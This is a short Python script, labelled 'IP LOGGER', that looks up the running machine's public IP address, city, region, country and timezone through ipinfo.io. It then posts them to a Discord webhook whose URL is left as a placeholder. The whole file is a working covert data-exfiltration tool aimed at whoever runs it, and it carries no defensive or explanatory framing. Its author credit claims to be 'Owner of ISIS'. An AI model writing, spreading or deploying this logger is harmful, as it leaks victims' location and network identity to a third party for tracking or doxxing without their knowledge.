import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
from requests_toolbelt import user_agent
ipsite = "https://ipinfo.io/json"
stats = requests.get(ipsite)
json_stats = stats.json()
city = json_stats["city"]
ip = json_stats["ip"]
region = json_stats["region"]
country = json_stats["country"]
timezone = json_stats["timezone"] 

webhookurl = "webhookhere" 

def embed():
  webhook = DiscordWebhook(url=webhookurl)
  embed = DiscordEmbed(title="", color=192467)
  embed.add_embed_field(name=f"*__IP LOGGER__*", value=f"""
  `IP:` {ip}
  `CITY:` {city}
  `COUNTRY:` {country}
  `REGION:` {region}
  `TIMEZONE:` {timezone}
  """)
  embed.set_author(name="Made By tower | Owner of ISIS")
  embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/807523886433566750/1000065017506430996/16DCA446-0681-47F6-8F97-05D7EA5E42E3.gif')
  embed.set_footer(text=f"New Report | {ip}") 
  webhook.add_embed(embed)
  response = webhook.execute() 
embed()